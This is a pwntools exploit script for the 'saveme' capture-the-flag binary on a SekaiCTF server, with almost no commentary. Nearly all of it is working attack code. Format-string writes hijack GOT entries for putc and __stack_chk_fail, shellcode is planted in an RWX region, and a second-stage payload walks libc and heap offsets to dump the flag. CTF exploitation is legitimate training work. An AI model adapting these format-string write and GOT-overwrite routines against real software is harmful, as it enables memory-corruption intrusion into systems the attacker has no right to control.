from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './saveme'
HOST = 'challs.ctf.sekai.team'
PORT = 4001

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	#debug(r, [0x1531+0x4000])
	#debug(r, [0x5000+0x4000])
	debug(r, [])

p3 = 0x004015b7
rwx = 0x405000+0x10
r.recvuntil(b'gift: ')
leak = int(r.recvuntil(b'    ', True), 16)
dbg('leak')
r.sendlineafter(b'option: ', b'2')

# putc -> stack_chk_fail
# stack_chk_fail -> main
x = 14
payload = b''
payload += b'%{}c%{}$hhn'.format(0x4b, x)
payload += b'%{}c%{}$hhn'.format(0x115-0x4b, x+1)
payload += b'%{}c%{}$hhn'.format(0xe8-0x15, x+2)
payload += b'%{}c%{}$hhn'.format(0x114-0xe8, x+3)

payload = payload.ljust(0x30, b'a')
payload += flat(elf.got.putc, elf.got.putc+1)
payload += flat(elf.got.__stack_chk_fail, elf.got.__stack_chk_fail+1)
r.sendafter(b'person: ', payload)

def aaw4(addr, value):
	global x
	x += 2
	payload = b''
	rem = 0
	for i in range(4):
		to = (((value >> (i*8))) - rem) & 0xff
		if to == 0:
			to = 0x100
		payload += b'%{}c%{}$hhn'.format(to, x+i)
		rem += to
	payload = payload.ljust(0x30, b'a')
	for i in range(4):
		payload += flat(addr+i)
	r.sendafter(b'person: ', payload)

payload = asm('''
	push 0x405010
	pop rsi
	xor edi, edi
	xor eax, eax
	pop rdx
	syscall
	int3
''')

# build reader
for i in range(0, len(payload), 4):
	aaw4(rwx+i, u32(payload[i:i+4].ljust(4, b'\xf4')))

# putc -> rwx
aaw4(elf.got.putc, rwx)

libc_main_ret = leak + 0x68

# get libc addr from stack
# adjust address to main_arena.top ( -0x240b3 + 0x1ecb90 )
# deref
# adjust address to flag ( -0xe90 + 0x2a0)
# write
payload = b''
payload += b'\xf4' * 0xd
payload += asm('''
	mov rsi, {}
	mov rsi, qword ptr [rsi]
	sub rsi, 0x240b3
	add rsi, 0x1ecb90
	mov rsi, qword ptr [rsi]
	sub rsi, 0xe90
	add rsi, 0x2a0
	mov rdi, 1
	mov rax, 1
	mov rdx, 0x100
	syscall
	hlt
'''.format(libc_main_ret))
r.send(payload)
r.interactive()
r.close()

